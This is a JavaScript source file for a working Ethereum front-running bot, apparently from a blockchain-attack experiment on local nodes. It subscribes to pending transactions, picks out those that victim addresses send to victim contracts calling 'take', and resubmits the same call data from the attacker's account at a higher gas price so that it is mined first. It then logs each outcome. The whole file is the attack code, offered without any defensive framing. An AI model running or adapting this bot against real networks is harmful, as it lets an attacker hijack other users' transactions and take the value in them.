const {
    Web3, fs, net, path, axios, colors, abiDecoder, EventEmitter, TX_DIR, IPC_DIR, LOG_DIR, BUILD_DIR, DEPLOY_DIR, VICTIM_ADDR, VICTIM_CONTRACTS, PERIOD, N_CONFIRMATION, highlightResult, getTimeString
} = require('./const')

var web3;
var ADD_GASPRICE;
var succeed = false;
var account;
var subscription;
var logDir;


async function main() {
    var myArgs = process.argv.slice(2);

    if (myArgs.length <= 1) {
        console.error('Usage: node frontrunner.js <node_name> <addGasPrice>');
        process.exit(1);
    } else {
        nodeName = myArgs[0];
        addGas = myArgs[1];
        web3 = new Web3(new Web3.providers.IpcProvider(path.resolve(IPC_DIR, nodeName + '.ipc'), net));
        ADD_GASPRICE = web3.utils.toBN(web3.utils.toWei(addGas, 'gwei'));
        logDir = path.resolve(LOG_DIR, nodeName);
    }

    await init();

    console.log(getTimeString() + ' ' + colors.brightGreen('Frontrunner initiated at '
        + account + ', # peers = ' + await web3.eth.net.getPeerCount()));

    // gas_price_info = await getCurrentGasPrices();

    subscription = web3.eth.subscribe('pendingTransactions', function (error, result) {
    }).on("data",
        async function (transactionHash) {
            let transaction = await web3.eth.getTransaction(transactionHash);
            if (isFrontrunnable(transaction)) {
                await handleTransaction(transaction);
            }

            if (succeed) {
                console.log(getTimeString() + ' ' + "Front-running attack performed.");
                succeed = false;
            }
        })
}

async function init() {
    for (let i in VICTIM_CONTRACTS) {
        VICTIM_CONTRACTS[i] = VICTIM_CONTRACTS[i].toLowerCase()
    }
    for (let i in VICTIM_ADDR) {
        VICTIM_ADDR[i] = VICTIM_ADDR[i].toLowerCase()
    }

    rawText = fs.readFileSync(path.resolve(DEPLOY_DIR, 'victim.json'));
    abiObj = JSON.parse(rawText)['abi'];
    abiDecoder.addABI(abiObj);

    account = (await web3.eth.getAccounts())[0];
}

function isFrontrunnable(tx) {
    return tx != null && VICTIM_ADDR.includes(tx['from'].toLowerCase()) &&
        VICTIM_CONTRACTS.includes(tx['to'].toLowerCase());
}


async function handleTransaction(transaction) {

    let is_pending = await isPending(transaction['hash']);
    if (!is_pending)
        return;

    if (triggersFrontRun(transaction)) {
        console.log(getTimeString() + ' ' + 'Perform front running attack...');
        await performReplay(transaction);
        succeed = true;
    }
}


//select attacking transaction
function triggersFrontRun(transaction) {
    // console.log('Caught tx:')
    // console.log(transaction)

    let method = parseTx(transaction['input']);

    if (method != 'take') {
        console.log(getTimeString() + ' ' + colors.brightRed("method '" + method + "' != 'take'"))
        return false;
    }

    let log_str = 'Detected Victim Tx. TxHash: ' + transaction['hash'] + ' \tGasPrice: ' + getGasPrice(transaction);
    console.log(getTimeString() + ' ' + colors.yellow(log_str));

    return true;
}

function getGasPrice(transaction) {
    return (parseInt(transaction['gasPrice']) / 10 ** 9).toFixed(4) + " Gwei";
}


async function performReplay(transaction) {
    var nonce = await web3.eth.getTransactionCount(account, 'pending');
    var gasPrice = web3.utils.toBN(transaction['gasPrice']).add(ADD_GASPRICE).toString(10);

    let rawTx = {
        nonce: nonce,
        from: account,
        gasPrice: gasPrice,
        gas: '50000',
        to: transaction['to'],
        value: '0',
        data: transaction['input']
    };

    var signed = await web3.eth.signTransaction(rawTx);

    console.log(getTimeString() + ' ' + colors.brightRed(
        "Planning to replay " + transaction['hash'] + ' (' + getGasPrice(transaction) +
        ') with ' + signed['tx']['hash'] + ' (' + getGasPrice(signed['tx']) + ')'
    ));

    return await web3.eth.sendSignedTransaction(signed['raw'])
        .on('receipt', (receipt) => {
            recordEvent(receipt, transaction);
        }).on('confirmation', (cnum, receipt) => {
            if (cnum == N_CONFIRMATION) {
                console.log(getTimeString() + ' ' + colors.brightGreen('Tx ' + receipt['transactionHash'] + ' confirmed by ' + N_CONFIRMATION + ' blocks'));
            }
        }).catch(error => {
            console.error(getTimeString() + ' ' + 'Error occurred: ');
            console.error(getTimeString() + ' ' + error);
        });
}

main();

function parseTx(input) {
    if (input == '0x') {
        return '0x';
    }

    return abiDecoder.decodeMethod(input)['name'];
}

async function getCurrentGasPrices() {
    var response = await axios.get('https://ethgasstation.info/json/ethgasAPI.json')
    var prices = {
        low: response.data.safeLow / 10,
        medium: response.data.average / 10,
        high: response.data.fast / 10
    }

    var log_str = '***** gas price information *****'
    console.log(getTimeString() + ' ' + log_str);
    var log_str = 'High: ' + prices.high + '        medium: ' + prices.medium + '        low: ' + prices.low;
    console.log(getTimeString() + ' ' + log_str);

    return prices;
}

async function isPending(transactionHash) {
    return await web3.eth.getTransactionReceipt(transactionHash) == null;
}

function recordEvent(receipt, orig) {
    try {
        result = abiDecoder.decodeLogs(receipt.logs)[0].name;
        console.log(getTimeString() + ' ' + 'Result: ' + highlightResult(result) + ' (' + receipt['transactionHash'] + ')');

        if (orig == null) {
            return;
        }

        resultObj = {
            orig: orig['hash'],
            this: receipt['transactionHash'],
            result: result
        };

        var logStream = fs.createWriteStream(path.resolve(logDir, 'FR.jsonl'), { flags: 'a' });
        logStream.write(JSON.stringify(resultObj));
        logStream.end('\n');
    } catch (e) {
        console.error(getTimeString() + ' ' + e);
        process.exit(1);
    }
}
